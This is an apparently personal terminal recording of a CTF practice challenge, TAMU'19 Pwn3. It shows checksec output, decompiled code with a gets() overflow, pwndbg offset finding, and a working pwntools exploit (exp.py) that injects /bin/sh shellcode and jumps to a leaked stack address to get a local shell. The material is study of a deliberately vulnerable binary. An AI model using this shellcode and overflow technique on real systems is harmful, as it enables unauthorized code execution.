@@ -1,0 +1,374 @@
+──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ asciinema rec pwn3.cast                                           
+asciinema: recording asciicast to pwn3.cast
+asciinema: press <ctrl-d> or type "exit" when you're done
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ ls   
+pwn3  pwn3.cast
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ chmod +x pnw3              
+chmod: cannot access 'pnw3': No such file or directory
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ chmod +x pwn3
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ ./pwn3 
+Take this, you might need it on your journey 0xff8a88de!
+okay
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ file pwn3 
+pwn3: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ pwn checksec own3     
+usage: pwn checksec [-h] [--file [elf ...]] [elf ...]
+pwn checksec: error: argument elf: can't open 'own3': [Errno 2] No such file or directory: 'own3'
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ pwn checksec pwn3 
+[*] "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3/pwn3"
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ cat > ghidra.txt                                                  
+main:
+undefined4 main(void)
+
+{
+  setvbuf(_stdout,(char *)0x2,0,0);
+  echo();
+  return 0;
+}
+
+echo :
+void echo(void)
+
+{
+  char local_12e [294];
+  
+  printf("Take this, you might need it on your journey %p!\n",local_12e);
+  gets(local_12e);
+  return;
+}
+
+^C
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ gdb ./pwn3                                                        
+GNU gdb (Debian 16.3-1) 16.3
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 209 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
+Reading symbols from ./pwn3...
+(No debugging symbols found in ./pwn3)
+------- tip of the day (disable with set show-tips off) -------
+stepuntilasm <assembly-instruction [operands]> steps program forward until matching instruction occures
+pwndbg> d main
+pwndbg> b main
+Breakpoint 1 at 0x5f2
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x000005e3 <+0>:	lea    ecx,[esp+0x4]
+   0x000005e7 <+4>:	and    esp,0xfffffff0
+   0x000005ea <+7>:	push   DWORD PTR [ecx-0x4]
+   0x000005ed <+10>:	push   ebp
+   0x000005ee <+11>:	mov    ebp,esp
+   0x000005f0 <+13>:	push   ebx
+   0x000005f1 <+14>:	push   ecx
+   0x000005f2 <+15>:	call   0x629 <__x86.get_pc_thunk.ax>
+   0x000005f7 <+20>:	add    eax,0x19d5
+   0x000005fc <+25>:	mov    edx,DWORD PTR [eax+0x28]
+   0x00000602 <+31>:	mov    edx,DWORD PTR [edx]
+   0x00000604 <+33>:	push   0x0
+   0x00000606 <+35>:	push   0x0
+   0x00000608 <+37>:	push   0x2
+   0x0000060a <+39>:	push   edx
+   0x0000060b <+40>:	mov    ebx,eax
+   0x0000060d <+42>:	call   0x440 <setvbuf@plt>
+   0x00000612 <+47>:	add    esp,0x10
+   0x00000615 <+50>:	call   0x59d <echo>
+   0x0000061a <+55>:	mov    eax,0x0
+   0x0000061f <+60>:	lea    esp,[ebp-0x8]
+   0x00000622 <+63>:	pop    ecx
+   0x00000623 <+64>:	pop    ebx
+   0x00000624 <+65>:	pop    ebp
+   0x00000625 <+66>:	lea    esp,[ecx-0x4]
+   0x00000628 <+69>:	ret
+End of assembler dump.
+pwndbg> b echo
+Breakpoint 2 at 0x5a1
+pwndbg> r
+Starting program: /home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3/pwn3 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x565555f2 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
+ EAX  0x565555e3 (main) ◂— lea ecx, [esp + 4]
+ EBX  0xf7f9ae14 ◂— 0x232d0c /* '\x0c-#' */
+ ECX  0xffffcda0 ◂— 1
+ EDX  0xffffcdc0 —▸ 0xf7f9ae14 ◂— 0x232d0c /* '\x0c-#' */
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
+ ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+ EBP  0xffffcd88 ◂— 0
+ ESP  0xffffcd80 —▸ 0xffffcda0 ◂— 1
+ EIP  0x565555f2 (main+15) ◂— call __x86.get_pc_thunk.ax
+───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
+ ► 0x565555f2 <main+15>    call   __x86.get_pc_thunk.ax       <__x86.get_pc_thunk.ax>
+        arg[0]: 0xffffcda0 ◂— 1
+        arg[1]: 0xf7f9ae14 ◂— 0x232d0c /* '\x0c-#' */
+        arg[2]: 0
+        arg[3]: 0xf7d8ccc3 ◂— add esp, 0x10
+ 
+   0x565555f7 <main+20>    add    eax, 0x19d5
+   0x565555fc <main+25>    mov    edx, dword ptr [eax + 0x28]
+   0x56555602 <main+31>    mov    edx, dword ptr [edx]
+   0x56555604 <main+33>    push   0
+   0x56555606 <main+35>    push   0
+   0x56555608 <main+37>    push   2
+   0x5655560a <main+39>    push   edx
+   0x5655560b <main+40>    mov    ebx, eax
+   0x5655560d <main+42>    call   setvbuf@plt                 <setvbuf@plt>
+ 
+   0x56555612 <main+47>    add    esp, 0x10
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp 0xffffcd80 —▸ 0xffffcda0 ◂— 1
+01:0004│-004 0xffffcd84 —▸ 0xf7f9ae14 ◂— 0x232d0c /* '\x0c-#' */
+02:0008│ ebp 0xffffcd88 ◂— 0
+03:000c│+004 0xffffcd8c —▸ 0xf7d8ccc3 ◂— add esp, 0x10
+04:0010│+008 0xffffcd90 ◂— 0
+05:0014│+00c 0xffffcd94 —▸ 0xffffce54 —▸ 0xffffd03d ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3/pwn3"
+06:0018│+010 0xffffcd98 —▸ 0xf7da6029 ◂— add ebx, 0x1f4deb
+07:001c│+014 0xffffcd9c —▸ 0xf7d8ccc3 ◂— add esp, 0x10
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► 0 0x565555f2 main+15
+   1 0xf7d8ccc3 None
+   2 0xf7d8cd88 __libc_start_main+136
+   3 0x56555491 _start+49
+────────────────────────────────────────────────────────────────────────────────
+pwndbg> c
+Continuing.
+
+Breakpoint 2, 0x565555a1 in echo ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
+*EAX  0
+*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+*ECX  0
+*EDX  0xf7f9c8e0 ◂— 0
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
+ ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+*EBP  0xffffcd78 —▸ 0xffffcd88 ◂— 0
+*ESP  0xffffcd74 —▸ 0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+*EIP  0x565555a1 (echo+4) ◂— sub esp, 0x134
+───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
+ ► 0x565555a1 <echo+4>     sub    esp, 0x134     ESP => 0xffffcc40 (0xffffcd74 - 0x134)
+   0x565555a7 <echo+10>    call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>
+ 
+   0x565555ac <echo+15>    add    ebx, 0x1a20
+   0x565555b2 <echo+21>    sub    esp, 8
+   0x565555b5 <echo+24>    lea    eax, [ebp - 0x12a]
+   0x565555bb <echo+30>    push   eax
+   0x565555bc <echo+31>    lea    eax, [ebx - 0x191c]
+   0x565555c2 <echo+37>    push   eax
+   0x565555c3 <echo+38>    call   printf@plt                  <printf@plt>
+ 
+   0x565555c8 <echo+43>    add    esp, 0x10
+   0x565555cb <echo+46>    sub    esp, 0xc
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp 0xffffcd74 —▸ 0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+01:0004│ ebp 0xffffcd78 —▸ 0xffffcd88 ◂— 0
+02:0008│+004 0xffffcd7c —▸ 0x5655561a (main+55) ◂— mov eax, 0
+03:000c│+008 0xffffcd80 —▸ 0xffffcda0 ◂— 1
+04:0010│+00c 0xffffcd84 —▸ 0xf7f9ae14 ◂— 0x232d0c /* '\x0c-#' */
+05:0014│+010 0xffffcd88 ◂— 0
+06:0018│+014 0xffffcd8c —▸ 0xf7d8ccc3 ◂— add esp, 0x10
+07:001c│+018 0xffffcd90 ◂— 0
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► 0 0x565555a1 echo+4
+   1 0x5655561a main+55
+   2 0xf7d8ccc3 None
+   3 0xf7d8cd88 __libc_start_main+136
+   4 0x56555491 _start+49
+────────────────────────────────────────────────────────────────────────────────
+pwndbg> disass echo
+Dump of assembler code for function echo:
+   0x5655559d <+0>:	push   ebp
+   0x5655559e <+1>:	mov    ebp,esp
+   0x565555a0 <+3>:	push   ebx
+=> 0x565555a1 <+4>:	sub    esp,0x134
+   0x565555a7 <+10>:	call   0x565554a0 <__x86.get_pc_thunk.bx>
+   0x565555ac <+15>:	add    ebx,0x1a20
+   0x565555b2 <+21>:	sub    esp,0x8
+   0x565555b5 <+24>:	lea    eax,[ebp-0x12a]
+   0x565555bb <+30>:	push   eax
+   0x565555bc <+31>:	lea    eax,[ebx-0x191c]
+   0x565555c2 <+37>:	push   eax
+   0x565555c3 <+38>:	call   0x56555410 <printf@plt>
+   0x565555c8 <+43>:	add    esp,0x10
+   0x565555cb <+46>:	sub    esp,0xc
+   0x565555ce <+49>:	lea    eax,[ebp-0x12a]
+   0x565555d4 <+55>:	push   eax
+   0x565555d5 <+56>:	call   0x56555420 <gets@plt>
+   0x565555da <+61>:	add    esp,0x10
+   0x565555dd <+64>:	nop
+   0x565555de <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x565555e1 <+68>:	leave
+   0x565555e2 <+69>:	ret
+End of assembler dump.
+pwndbg> b *0x565555da
+Breakpoint 3 at 0x565555da
+pwndbg> c
+Continuing.
+Take this, you might need it on your journey 0xffffcc4e!
+AAAAAAAAAAAAAAAAA
+
+Breakpoint 3, 0x565555da in echo ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
+*EAX  0xffffcc4e ◂— 'AAAAAAAAAAAAAAAAA'
+ EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+*ECX  0xf7f9c8ec ◂— 0
+*EDX  0
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
+ ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+ EBP  0xffffcd78 —▸ 0xffffcd88 ◂— 0
+*ESP  0xffffcc30 —▸ 0xffffcc4e ◂— 'AAAAAAAAAAAAAAAAA'
+*EIP  0x565555da (echo+61) ◂— add esp, 0x10
+───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
+ ► 0x565555da <echo+61>    add    esp, 0x10                    ESP => 0xffffcc40 (0xffffcc30 + 0x10)
+   0x565555dd <echo+64>    nop    
+   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]     EBX, [0xffffcd74] => 0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+   0x565555e1 <echo+68>    leave  
+   0x565555e2 <echo+69>    ret                                <main+55>
+    ↓
+   0x5655561a <main+55>    mov    eax, 0             EAX => 0
+   0x5655561f <main+60>    lea    esp, [ebp - 8]     ESP => 0xffffcd80 —▸ 0xffffcda0 ◂— 1
+   0x56555622 <main+63>    pop    ecx                ECX => 0xffffcda0
+   0x56555623 <main+64>    pop    ebx                EBX => 0xf7f9ae14
+   0x56555624 <main+65>    pop    ebp                EBP => 0
+   0x56555625 <main+66>    lea    esp, [ecx - 4]     ESP => 0xffffcd9c —▸ 0xf7d8ccc3 ◂— add esp, 0x10
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp   0xffffcc30 —▸ 0xffffcc4e ◂— 'AAAAAAAAAAAAAAAAA'
+01:0004│-144   0xffffcc34 —▸ 0xffffcc4e ◂— 'AAAAAAAAAAAAAAAAA'
+02:0008│-140   0xffffcc38 ◂— 8
+03:000c│-13c   0xffffcc3c —▸ 0x565555ac (echo+15) ◂— add ebx, 0x1a20
+04:0010│-138   0xffffcc40 ◂— 0x400000
+05:0014│-134   0xffffcc44 ◂— 0x10
+06:0018│-130   0xffffcc48 ◂— 0x40 /* '@' */
+07:001c│ eax-2 0xffffcc4c ◂— 0x41410000
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► 0 0x565555da echo+61
+   1 0x5655561a main+55
+   2 0xf7d8ccc3 None
+   3 0xf7d8cd88 __libc_start_main+136
+   4 0x56555491 _start+49
+────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/20wx $ebp-0x12a
+0xffffcc4e:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc5e:	0x00000041	0x00000000	0x00000000	0x00000000
+0xffffcc6e:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffcc7e:	0x00000000	0x00000000	0x00000000	0x00200000
+0xffffcc8e:	0xcfec0000	0x5034f7ff	0xce5c5655	0x1c41ffff
+pwndbg> info frame
+Stack level 0, frame at 0xffffcd80:
+ eip = 0x565555da in echo; saved eip = 0x5655561a
+ called by frame at 0xffffcda0
+ Arglist at 0xffffcd78, args: 
+ Locals at 0xffffcd78, Previous frame's sp is 0xffffcd80
+ Saved registers:
+  ebx at 0xffffcd74, ebp at 0xffffcd78, eip at 0xffffcd7c
+pwndbg> p 0xffffcd7c - 0xffffcc4e
+$1 = 302
+pwndbg> exit
+                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ pwn checksec pwn3
+[*] "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3/pwn3"
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+            
+            
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ vim exp.py
+                                                                                                   
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ python exp.py                
+[+] Starting local process './pwn3': pid 18378
+BUffer Address : b'0xffbcb99e'
+[*] Switching to interactive mode
+$ ls
+__pycache__  core.16509  core.17108  exp.py  ghidra.txt  pwn3  pwn3.cast
+$ id
+uid=1000(himanshu) gid=1000(himanshu) groups=1000(himanshu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),123(wireshark),131(kaboxer),134(docker)
+$ exit
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './pwn3' stopped with exit code 0 (pid 18378)
+[*] Got EOF while sending in interactive
+                                                                                                   
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ cat pwn.py
+cat: pwn.py: No such file or directory
+                                                                                                   
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ cat exp.py
+from pwn import *
+
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+pay = b""
+pay += shellcode
+pay += b"A" * (302 - len(shellcode))
+
+p = process("./pwn3")
+p.recvuntil(b"Take this, you might need it on your journey ")
+leak = p.recvline().strip(b"!\n")
+print(f"BUffer Address : {leak}")
+
+buff_addr = int(leak , 16)
+
+pay += p32(buff_addr)
+
+p.sendline(pay)
+p.interactive()
+
+                                                                                                   
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ exit
+asciinema: recording finished
+asciinema: asciicast saved to pwn3.cast
+                                                                                                   
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/TAMU'19: Pwn3]
+└─$ 
+
+            
